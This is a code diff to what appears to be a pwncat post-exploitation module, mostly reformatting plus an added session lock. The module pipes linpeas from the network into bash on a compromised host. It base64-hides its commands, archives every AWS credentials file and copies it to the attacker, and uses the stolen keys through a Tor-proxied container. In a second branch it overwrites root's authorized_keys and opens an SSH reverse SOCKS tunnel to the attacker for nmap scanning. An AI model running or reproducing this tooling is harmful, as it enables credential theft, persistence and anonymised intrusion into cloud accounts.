@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 from io import StringIO
-import os 
+import os
 from pwncat import util
 from pwncat.modules import Status, BaseModule, ModuleFailed, Argument
 from pwncat.manager import Session
@@ -11,6 +11,7 @@ import subprocess
 import shutil
 import tarfile
 import base64
+
 
 class Module(BaseModule):
     """ 
@@ -29,12 +30,14 @@ class Module(BaseModule):
             def log(message):
                 # logger.info(message)
                 session.log(message)
-            
+
             def enumerate():
                 # run host enumeration
-                payload = base64.b64encode(b'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex | tee /tmp/linpeas.txt')
+                payload = base64.b64encode(
+                    b'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex | tee /tmp/linpeas.txt')
                 log("payload loaded and ready")
-                result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_linpeas | base64 -d | /bin/bash'")
+                result = session.platform.run(
+                    f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_linpeas | base64 -d | /bin/bash'")
                 log(result)
 
             def exfiltrate():
@@ -59,7 +62,8 @@ aws configure set aws_session_token $AWS_SESSION_TOKEN --profile=$PROFILE
 aws configure set region $AWS_DEFAULT_REGION --profile=$PROFILE
 aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
                 log("creating an instance creds profile...")
-                result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awsconfig | base64 -d | /bin/bash'")
+                result = session.platform.run(
+                    f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awsconfig | base64 -d | /bin/bash'")
                 log(result)
 
                 # remove any pre-existing cred archived
@@ -67,66 +71,77 @@ aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
                     session.platform.unlink('/tmp/aws_creds.tgz')
 
                 # create an archive of all aws creds
-                payload = base64.b64encode(b"find / \( -type f -a \( -name 'credentials' -a -path '*.aws/credentials' \) -o \( -name 'config' -a -path '*.aws/config' \) \)  -printf '%P\n'")
+                payload = base64.b64encode(
+                    b"find / \( -type f -a \( -name 'credentials' -a -path '*.aws/credentials' \) -o \( -name 'config' -a -path '*.aws/config' \) \)  -printf '%P\n'")
                 log("running credentials find...")
-                result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awscredsfind | base64 -d | /bin/bash'")
+                result = session.platform.run(
+                    f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awscredsfind | base64 -d | /bin/bash'")
                 log(result)
 
                 # create an archive of all aws creds
-                payload = base64.b64encode(b"tar -czvf /tmp/aws_creds.tgz -C / $(find / \( -type f -a \( -name 'credentials' -a -path '*.aws/credentials' \) -o \( -name 'config' -a -path '*.aws/config' \) \)  -printf '%P\n')")
+                payload = base64.b64encode(
+                    b"tar -czvf /tmp/aws_creds.tgz -C / $(find / \( -type f -a \( -name 'credentials' -a -path '*.aws/credentials' \) -o \( -name 'config' -a -path '*.aws/config' \) \)  -printf '%P\n')")
                 log("payload loaded and ready")
-                result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awscreds | base64 -d | /bin/bash'")
+                result = session.platform.run(
+                    f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awscreds | base64 -d | /bin/bash'")
                 log(result)
-                
+
                 # cleanup any existing local cred archives for this host
                 if Path(f'/tmp/{hostname}_aws_creds.tgz').exists():
                     os.unlink(f'/tmp/{hostname}_aws_creds.tgz')
-                
+
                 # transfer files from target to attacker
                 log("copying /tmp/aws_creds.tgz...")
                 with session.platform.open('/tmp/aws_creds.tgz', 'rb') as f1:
-                    with open(f'/tmp/{hostname}_aws_creds.tgz','wb') as f2:
+                    with open(f'/tmp/{hostname}_aws_creds.tgz', 'wb') as f2:
                         f2.write(f1.read())
-                
+
                 log("copying /tmp/linpeas.txt...")
                 with session.platform.open('/tmp/linpeas.txt', 'rb') as f1:
-                    with open(f'/tmp/{hostname}_linpeas.txt','wb') as f2:
+                    with open(f'/tmp/{hostname}_linpeas.txt', 'wb') as f2:
                         f2.write(f1.read())
 
                 # remove temporary archive from target
                 if session.platform.Path('/tmp/aws_creds.tgz').exists():
                     session.platform.unlink('/tmp/aws_creds.tgz')
-            
+
             def credentialed_access_aws_tor(jobname, cwd, script, container='ghcr.io/credibleforce/proxychains-scoutsuite-aws:main'):
                 # start torproxy docker
                 try:
-                    payload = base64.b64encode(f'docker stop torproxy || true; docker rm torproxy || true; docker run -d --rm --name torproxy -p 9050:9050 dperson/torproxy'.encode('utf-8'))
-                    result = subprocess.run(['/bin/bash', '-c', f'echo {payload.decode()} | tee /tmp/payload_{jobname}_torproxy | base64 -d | /bin/bash'], cwd=cwd, capture_output=True, text=True)
+                    payload = base64.b64encode(
+                        f'docker stop torproxy || true; docker rm torproxy || true; docker run -d --rm --name torproxy -p 9050:9050 dperson/torproxy'.encode('utf-8'))
+                    result = subprocess.run(
+                        ['/bin/bash', '-c', f'echo {payload.decode()} | tee /tmp/payload_{jobname}_torproxy | base64 -d | /bin/bash'], cwd=cwd, capture_output=True, text=True)
                     log(f'Return Code: {result.returncode}')
                     log(f'Output: {result.stdout}')
                     log(f'Error Output: {result.stderr}')
-                    
+
                     if result.returncode != 0:
                         log(f'The bash script encountered an error.')
                     else:
                         log(f"successfully started torproxy docker.")
-                        log(f"stopping and removing and {script} tunnelled container proxychains-{jobname}-aws...")
-                        payload = base64.b64encode(f'docker rm --force proxychains-{jobname}-aws'.encode('utf-8'))
-                        result = subprocess.run(['/bin/bash', '-c', f'echo {payload.decode()} | tee /tmp/payload_{jobname} | base64 -d | /bin/bash'], cwd=cwd, capture_output=True, text=True)
+                        log(
+                            f"stopping and removing and {script} tunnelled container proxychains-{jobname}-aws...")
+                        payload = base64.b64encode(
+                            f'docker rm --force proxychains-{jobname}-aws'.encode('utf-8'))
+                        result = subprocess.run(
+                            ['/bin/bash', '-c', f'echo {payload.decode()} | tee /tmp/payload_{jobname} | base64 -d | /bin/bash'], cwd=cwd, capture_output=True, text=True)
                         log(f'Return Code: {result.returncode}')
                         log(f'Output: {result.stdout}')
                         log(f'Error Output: {result.stderr}')
-                        
+
                         if result.returncode != 0:
                             log(f'The bash script encountered an error.')
-                        
+
                         log(f"running {script} via torproxy tunnelled container...")
-                        payload = base64.b64encode(f'export TORPROXY="$(docker inspect -f \'{{{{range .NetworkSettings.Networks}}}}{{{{.IPAddress}}}}{{{{end}}}}\' torproxy)"; docker run --rm --name=proxychains-{jobname}-aws --link torproxy:torproxy -e TORPROXY=$TORPROXY -v "/tmp":"/tmp" -v "$PWD/root":"/root" -v "$PWD":"/{jobname}" {container} /bin/bash /{jobname}/{script}'.encode('utf-8'))
-                        result = subprocess.run(['/bin/bash', '-c', f'echo {payload.decode()} | tee /tmp/payload_{jobname} | base64 -d | /bin/bash'], cwd=cwd, capture_output=True, text=True)
+                        payload = base64.b64encode(
+                            f'export TORPROXY="$(docker inspect -f \'{{{{range .NetworkSettings.Networks}}}}{{{{.IPAddress}}}}{{{{end}}}}\' torproxy)"; docker run --rm --name=proxychains-{jobname}-aws --link torproxy:torproxy -e TORPROXY=$TORPROXY -v "/tmp":"/tmp" -v "$PWD/root":"/root" -v "$PWD":"/{jobname}" {container} /bin/bash /{jobname}/{script}'.encode('utf-8'))
+                        result = subprocess.run(
+                            ['/bin/bash', '-c', f'echo {payload.decode()} | tee /tmp/payload_{jobname} | base64 -d | /bin/bash'], cwd=cwd, capture_output=True, text=True)
                         log(f'Return Code: {result.returncode}')
                         log(f'Output: {result.stdout}')
                         log(f'Error Output: {result.stderr}')
-                        
+
                         if result.returncode != 0:
                             log(f'The bash script encountered an error.')
                 except Exception as e:
@@ -140,7 +155,7 @@ aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
                 task_path.mkdir(parents=True)
 
                 # create aws directory
-                aws_dir = Path.joinpath(Path.home(),Path(".aws"))
+                aws_dir = Path.joinpath(Path.home(), Path(".aws"))
                 if aws_dir.exists() and aws_dir.is_dir():
                     shutil.rmtree(aws_dir)
                 aws_dir.mkdir(parents=True)
@@ -149,9 +164,11 @@ aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
                 file = tarfile.open(f'/tmp/{hostname}_aws_creds.tgz')
                 file.extract('root/.aws/credentials', task_path)
                 file.extract('root/.aws/config', task_path)
-                shutil.copy2(Path.joinpath(task_path, 'root/.aws/credentials'),Path.joinpath(aws_dir, 'credentials'))
-                shutil.copy2(Path.joinpath(task_path, 'root/.aws/config'),Path.joinpath(aws_dir, 'config'))
-                
+                shutil.copy2(Path.joinpath(
+                    task_path, 'root/.aws/credentials'), Path.joinpath(aws_dir, 'credentials'))
+                shutil.copy2(Path.joinpath(
+                    task_path, 'root/.aws/config'), Path.joinpath(aws_dir, 'config'))
+
                 # copy our payload to the local working directory
                 task_script = Path(f"{script_dir}/../resources/{task_name}.sh")
                 shutil.copy2(task_script, task_path)
@@ -160,9 +177,14 @@ aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
                 linpeas = Path(f'/tmp/{hostname}_linpeas.txt')
                 shutil.copy2(linpeas, task_path)
 
+            # start session lock
+            log("Creating session lock...")
+            session_lock = Path("/tmp/pwncat_session.lock")
+            session_lock.touch()
+
             # get hostname for disk loggings
             hostname = session.platform.getenv('HOSTNAME')
-            
+
             script_dir = os.path.dirname(os.path.realpath(__file__))
             log(f"script dir: {script_dir}")
             task_name = session.platform.getenv("TASK")
@@ -172,59 +194,69 @@ aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
                 exfiltrate()
                 prep_local_aws_env(task_name)
                 credentialed_access_aws_tor(
-                    task_name, 
+                    task_name,
                     f'/{task_name}',
                     f'{task_name}.sh'
                 )
             elif task_name == "socksscan":
                 # PROXYCHAINS_CONF_FILE=./myproxychains.conf
                 # get the attacker public ip
-                result = subprocess.run(['curl', '-s', 'https://icanhazip.com'], cwd='/tmp', capture_output=True, text=True)
+                result = subprocess.run(
+                    ['curl', '-s', 'https://icanhazip.com'], cwd='/tmp', capture_output=True, text=True)
                 attacker_ip = result.stdout
                 log(f'Attacker IP: {attacker_ip}')
-                
+
                 # get the attacker lan
-                payload = base64.b64encode(b'ip -o -f inet addr show | awk \'/scope global/ {print $4}\' | head -1')
-                result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | base64 -d | /bin/bash'")
+                payload = base64.b64encode(
+                    b'ip -o -f inet addr show | awk \'/scope global/ {print $4}\' | head -1')
+                result = session.platform.run(
+                    f"/bin/bash -c 'echo {payload.decode()} | base64 -d | /bin/bash'")
                 target_lan = bytes(result.stdout).decode().strip()
                 log(f'Target LAN: {target_lan}')
 
                 # transfer files from target to attacker
                 log("copying private key to target...")
-                with open(f'/home/socksuser/.ssh/socksuser_key','rb') as f1:
+                with open(f'/home/socksuser/.ssh/socksuser_key', 'rb') as f1:
                     with session.platform.open('/tmp/sockskey', 'wb') as f2:
                         f2.write(f1.read())
-                result = session.platform.run(f"/bin/bash -c 'chmod 0600 /tmp/sockskey'")
+                result = session.platform.run(
+                    f"/bin/bash -c 'chmod 0600 /tmp/sockskey'")
                 log("adding public key to authorized on target...")
-                with open(f'/home/socksuser/.ssh/socksuser_key.pub','rb') as f1:
+                with open(f'/home/socksuser/.ssh/socksuser_key.pub', 'rb') as f1:
                     with session.platform.open('/root/.ssh/authorized_keys', 'wb') as f2:
                         f2.write(f1.read())
-                
+
                 # create socksproxy on target
                 log('starting socksproxy on target...')
-                payload = base64.b64encode(f'ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/sockskey -f -N -D 9050 localhost'.encode())
-                result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | base64 -d | /bin/bash'")
+                payload = base64.b64encode(
+                    f'ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/sockskey -f -N -D 9050 localhost'.encode())
+                result = session.platform.run(
+                    f"/bin/bash -c 'echo {payload.decode()} | base64 -d | /bin/bash'")
                 log(f'Result: {result.returncode}')
 
                 # forward local socksproxy to attacker
                 log('forwarding target socksproxy to attacker...')
-                payload = base64.b64encode(f'ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/sockskey -f -N -R 9050:localhost:9050 socksuser@{attacker_ip}'.encode())
-                result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | base64 -d | /bin/bash'")
+                payload = base64.b64encode(
+                    f'ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/sockskey -f -N -R 9050:localhost:9050 socksuser@{attacker_ip}'.encode())
+                result = session.platform.run(
+                    f"/bin/bash -c 'echo {payload.decode()} | base64 -d | /bin/bash'")
                 log(f'Result: {result.returncode}')
 
                 # run nmap scan via proxychains
                 log('running proxychains nmap...')
-                result = subprocess.run(['proxychains', 'nmap', '-Pn', '-sT', '-T2', '-oX', 'scan.xml', '-p22,80,443,1433,3306,5000,5432,5900,6379,8000,8080,8088,8090,8091,9200,27017', target_lan], cwd='/tmp', capture_output=True, text=True)
+                result = subprocess.run(['proxychains', 'nmap', '-Pn', '-sT', '-T2', '-oX', 'scan.xml',
+                                        '-p22,80,443,1433,3306,5000,5432,5900,6379,8000,8080,8088,8090,8091,9200,27017', target_lan], cwd='/tmp', capture_output=True, text=True)
                 log(f'Result: {result.returncode}')
-                
-                # convert to json 
+
+                # convert to json
                 # cat /tmp/scan.xml | jc --xml -p > /tmp/scan.json
 
                 # kill ssh socksproxy and portforward
                 log('killing ssh socksproxy and portforward...')
-                result = session.platform.run('kill -9 $(pgrep "^ssh .* /tmp/sockskey" -f)')
+                result = session.platform.run(
+                    'kill -9 $(pgrep "^ssh .* /tmp/sockskey" -f)')
                 log(f'Result: {result.returncode}')
-                
+
                 # remove temporary archive from target
                 if session.platform.Path('/tmp/sockskey').exists():
                     session.platform.unlink('/tmp/sockskey')
@@ -232,6 +264,10 @@ aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
                 result = session.platform.run("${default_payload}")
                 log(result)
 
-            log( f"ran {self.name}")
+            log("Removing sesssion lock...")
+            session_lock.unlink()
+
+            log(f"Done.")
         except Exception as e:
             session.log(f'Error executing bash script: {e}')
+            Path(f"/tmp/pwncat_session.lock").unlink()
